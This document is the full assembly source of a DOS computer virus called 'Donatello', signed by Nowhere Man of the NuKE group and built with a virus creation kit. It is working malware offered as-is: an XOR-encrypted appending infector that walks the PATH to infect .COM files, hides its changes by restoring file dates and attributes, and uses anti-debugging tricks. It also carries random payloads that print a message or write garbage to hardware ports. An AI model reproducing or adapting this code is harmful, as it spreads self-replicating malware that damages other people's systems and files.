; DONTELLO.ASM -- Donatello Virus
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Nowhere Man

virus_type      equ     0                       ; Appending Virus
is_encrypted    equ     1                       ; We're encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

main            proc    near
		db      0E9h,00h,00h            ; Near jump (for compatibility)
start:          call    find_offset             ; Like a PUSH IP
find_offset:    pop     bp                      ; BP holds old IP
		sub     bp,offset find_offset   ; Adjust for length of host

		call    encrypt_decrypt         ; Decrypt the virus

start_of_code   label   near

		lea     si,[bp + buffer]        ; SI points to original start
		mov     di,0100h                ; Push 0100h on to stack for
		push    di                      ; return to main program
		movsw                           ; Copy the first two bytes
		movsb                           ; Copy the third byte

		mov     di,bp                   ; DI points to start of virus

		mov     bp,sp                   ; BP points to stack
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer on stack
		int     021h

stop_tracing:   mov     cx,09EBh
		mov     ax,0FE05h               ; Acutal move, plus a HaLT
		jmp     $-2
		add     ah,03Bh                 ; AH now equals 025h
		jmp     $-10                    ; Execute the HaLT
		lea     bx,[di + null_vector]   ; BX points to new routine
		push    cs                      ; Transfer CS into ES
		pop     es                      ; using a PUSH/POP
		int     021h
		mov     al,1                    ; Disable interrupt 1, too
		int     021h
		jmp     short skip_null         ; Hop over the loop
null_vector:    jmp     $                       ; An infinite loop
skip_null:      mov     byte ptr [di + lock_keys + 1],130  ; Prefetch unchanged
lock_keys:      mov     al,128                  ; Change here screws DEBUG
		out     021h,al                 ; If tracing then lock keyboard

		call    get_random
		mov     cx,0014h                ; CX holds the divisor
		cwd                             ; Sign-extend AX into DX:AX
		div     cx                      ; Divide AX by CX
		or      dx,dx                   ; Is the remaindier zero?
		jne     skip00                  ; If not equal, skip effect
		jmp     short strt00            ; Success -- skip jump
skip00:         jmp     end00                   ; Skip the routine
strt00:         lea     si,[di + data00]        ; SI points to data
		mov     ah,0Eh                  ; BIOS display char. function
display_loop:   lodsb                           ; Load the next char. into AL
		or      al,al                   ; Is the character a null?
		je      disp_strnend            ; If it is, exit
		int     010h                    ; BIOS video interrupt
		jmp     short display_loop      ; Do the next character
disp_strnend:

end00:          call    get_random
		mov     cx,0064h                ; CX holds the divisor
		cwd                             ; Sign-extend AX into DX:AX
		div     cx                      ; Divide AX by CX
		or      dx,dx                   ; Is the remaindier zero?
		jne     skip01                  ; If not equal, skip effect
		jmp     short strt01            ; Success -- skip jump
skip01:         jmp     end01                   ; Skip the routine
strt01:         xor     ah,ah                   ; BIOS get time function
		int     1Ah
		xchg    dx,ax                   ; AX holds low word of timer
		mov     dx,0FFh                 ; Start with port 255
out_loop:       out     dx,al                   ; OUT a value to the port
		dec     dx                      ; Do the next port
		jne     out_loop                ; Repeat until DX = 0

end01:          mov     cx,0003h                ; Do 3 infections
search_loop:    push    cx                      ; Save CX
		call    search_files            ; Find and infect a file
		pop     cx                      ; Restore CX
		loop    search_loop             ; Repeat until CX is 0

		jmp     short strt02            ; Success -- skip jump
skip02:         jmp     end02                   ; Skip the routine
strt02:         push    es                      ; Save ES
		mov     ax,050h                 ; Set the extra segement to
		mov     es,ax                   ; the BIOS area
		mov     byte ptr es:[0000h],1   ; Set print screen flag to
		pop     es                      ; "printing," restore ES

end02:
com_end:        pop     dx                      ; DX holds original DTA address
		mov     ah,01Ah                 ; DOS set DTA function
		int     021h

		mov     sp,bp                   ; Deallocate local buffer

		xor     ax,ax                   ;
		mov     bx,ax                   ;
		mov     cx,ax                   ;
		mov     dx,ax                   ; Empty out the registers
		mov     si,ax                   ;
		mov     di,ax                   ;
		mov     bp,ax                   ;

		ret                             ; Return to original program
main            endp


		db      0E2h,065h,076h,0A4h,0A6h

search_files    proc    near
		mov     bx,di                   ; BX points to the virus
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,135                  ; Allocate 135 bytes on stack

		mov     byte ptr [bp - 135],'\' ; Start with a backslash

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 134]           ; SI points to 64-byte buffer
		int     021h

		call    traverse_path           ; Start the traversal

traversal_loop: cmp     word ptr [bx + path_ad],0       ; Was the search unsuccessful?
		je      done_searching          ; If so then we're done
		call    found_subdir            ; Otherwise copy the subdirectory

		mov     ax,cs                   ; AX holds the code segment
		mov     ds,ax                   ; Set the data and extra
		mov     es,ax                   ; segments to the code segment

		xor     al,al                   ; Zero AL
		stosb                           ; NULL-terminate the directory

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 70]            ; DX points to the directory
		int     021h

		lea     dx,[bx + com_mask]      ; DX points to "*.COM"
		push    di
		mov     di,bx
		call    find_files              ; Try to infect a .COM file
		mov     bx,di
		pop     di
		jnc     done_searching          ; If successful the exit
		jmp     short traversal_loop    ; Keep checking the PATH

done_searching: mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 135]           ; DX points to old directory
		int     021h

		cmp     word ptr [bx + path_ad],0       ; Did we run out of directories?
		jne     at_least_tried          ; If not then exit
		stc                             ; Set the carry flag for failure
at_least_tried: mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller
com_mask        db      "*.COM",0               ; Mask for all .COM files
search_files    endp

traverse_path   proc    near
		mov     es,word ptr cs:[002Ch]  ; ES holds the enviroment segment
		xor     di,di                   ; DI holds the starting offset

find_path:      lea     si,[bx + path_string]   ; SI points to "PATH="
		lodsb                           ; Load the "P" into AL
		mov     cx,08000h               ; Check the first 32767 bytes
	repne   scasb                           ; Search until the byte is found
		mov     cx,4                    ; Check the next four bytes
check_next_4:   lodsb                           ; Load the next letter of "PATH="
		scasb                           ; Compare it to the environment
		jne     find_path               ; If there not equal try again
		loop    check_next_4            ; Otherwise keep checking

		mov     word ptr [bx + path_ad],di      ; Save the PATH address
		mov     word ptr [bx + path_ad + 2],es  ; Save the PATH's segment
		ret                             ; Return to caller

path_string     db      "PATH="                 ; The PATH string to search for
path_ad         dd      ?                       ; Holds the PATH's address
traverse_path   endp

found_subdir    proc    near
		lds     si,dword ptr [bx + path_ad]     ; DS:SI points to PATH
		lea     di,[bp - 70]            ; DI points to the work buffer
		push    cs                      ; Transfer CS into ES for
		pop     es                      ; byte transfer
move_subdir:    lodsb                           ; Load the next byte into AL
		cmp     al,';'                  ; Have we reached a separator?
		je      moved_one               ; If so we're done copying
		or      al,al                   ; Are we finished with the PATH?
		je      moved_last_one          ; If so get out of here
		stosb                           ; Store the byte at ES:DI
		jmp     short move_subdir       ; Keep transfering characters

moved_last_one: xor     si,si                   ; Zero SI to signal completion
moved_one:      mov     word ptr es:[bx + path_ad],si  ; Store SI in the path address
		ret                             ; Return to caller
found_subdir    endp

		db      095h,001h,027h,07Eh,08Fh


find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

		db      02Ch,015h,0BFh,02Dh,0F2h

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ah],(65279 - (finish - start))
		jbe     size_ok                 ; If it's small enough continue
		jmp     infection_done          ; Otherwise exit

size_ok:        mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,3                    ; CX holds bytes to read (3)
		lea     dx,[di + buffer]        ; DX points to buffer
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		xchg    dx,ax                   ; Faster than a PUSH AX
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		xchg    dx,ax                   ; Faster than a POP AX

		sub     ax,finish - start + 3   ; Adjust AX for a valid jump
		cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je      infection_done          ; If equal then exit
		mov     byte ptr [di + set_carry],1  ; Success -- the file is OK
		add     ax,finish - start       ; Re-adjust to make the jump
		mov     word ptr [di + new_jump + 1],ax  ; Construct jump

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,3                    ; CX holds bytes to write (3)
		lea     dx,[di + new_jump]      ; DX points to the jump we made
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		push    si                      ; Save SI through call
		call    encrypt_code            ; Write an encrypted copy
		pop     si                      ; Restore SI

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

set_carry       db      ?                       ; Set-carry-on-exit flag
buffer          db      090h,0CDh,020h          ; Buffer to hold old three bytes
new_jump        db      0E9h,?,?                ; New jump to virus
infect_file     endp


		db      0C4h,003h,038h,043h,07Fh

get_random      proc    near
		xor     ah,ah                   ; BIOS get clock count function
		int     01Ah
		xchg    dx,ax                   ; Transfer the count into AX
		ret                             ; Return to caller
get_random      endp

data00          db      "Cowabunga, dudes!  It's Donatello!",13,10
		db      "(Hey, John, can I be on Nightline too?)",13,10,0

vcl_marker      db      "[VCL]",0               ; VCL creation marker


note            db      "[Donatello]",0
		db      "Nowhere Man, [NuKE] '92",0
		db      "Hey, Donatello, be like Mike!",0

encrypt_code    proc    near
		push    bp                      ; Save BP
		mov     bp,di                   ; Use BP as pointer to code
		lea     si,[bp + encrypt_decrypt]; SI points to cipher routine

		xor     ah,ah                   ; BIOS get time function
		int     01Ah
		mov     word ptr [si + 9],dx    ; Low word of timer is new key

		xor     byte ptr [si + 1],8     ;
		xor     byte ptr [si + 8],1     ; Change all SIs to DIs
		xor     word ptr [si + 11],0101h; (and vice-versa)

		lea     di,[bp + finish]        ; Copy routine into heap
		mov     cx,finish - encrypt_decrypt - 1  ; All but final RET
		push    si                      ; Save SI for later
		push    cx                      ; Save CX for later
	rep     movsb                           ; Copy the bytes

		lea     si,[bp + write_stuff]   ; SI points to write stuff
		mov     cx,5                    ; CX holds length of write
	rep     movsb                           ; Copy the bytes

		pop     cx                      ; Restore CX
		pop     si                      ; Restore SI
		inc     cx                      ; Copy the RET also this time
	rep     movsb                           ; Copy the routine again

		mov     ah,040h                 ; DOS write to file function
		lea     dx,[bp + start]         ; DX points to virus

		lea     si,[bp + finish]        ; SI points to routine
		call    si                      ; Encrypt/write/decrypt

		mov     di,bp                   ; DI points to virus again
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

write_stuff:    mov     cx,finish - start       ; Length of code
		int     021h
encrypt_code    endp

end_of_code     label   near

encrypt_decrypt proc    near
		lea     si,[bp + start_of_code] ; SI points to code to decrypt
		mov     cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:       db      081h,034h,00h,00h       ; XOR a word by the key
		inc     si                      ; Do the next word
		inc     si                      ;
		loop    xor_loop                ; Loop until we're through
		ret                             ; Return to caller
encrypt_decrypt endp
finish          label   near

code            ends
		end     main
